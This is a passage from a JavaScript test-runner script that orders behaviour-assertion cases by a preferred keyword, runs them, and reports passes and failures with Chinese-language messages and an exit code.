      ...cases.filter(([name, fn]) => name.includes(prefer) || fn.toString().includes(prefer)),
      ...cases.filter(([name, fn]) => !name.includes(prefer) && !fn.toString().includes(prefer)),
    ]
  : cases

for (const [name, fn] of orderedCases) {
  let entry = ''
  try {
    const outcome = await fn()
    if (outcome === true) { passed += 1; continue }
    entry = `${name} —— ${outcome}`
  } catch (error) {
    entry = `${name} —— 抛异常：${error instanceof Error ? error.message : String(error)}`
  }
  failures.push(entry)
  if (bailOn && `FAIL  ${entry}`.includes(bailOn)) break
}

if (failures.length === 0) {
  process.stdout.write(`行为断言：${passed} 项通过，0 项失败。\n`)
  process.exit(0)
}
for (const f of failures) process.stderr.write(`FAIL  ${f}\n`)
process.stderr.write(`\n行为断言：${passed} 通过 / ${failures.length} 失败。\n`)
process.exit(1)
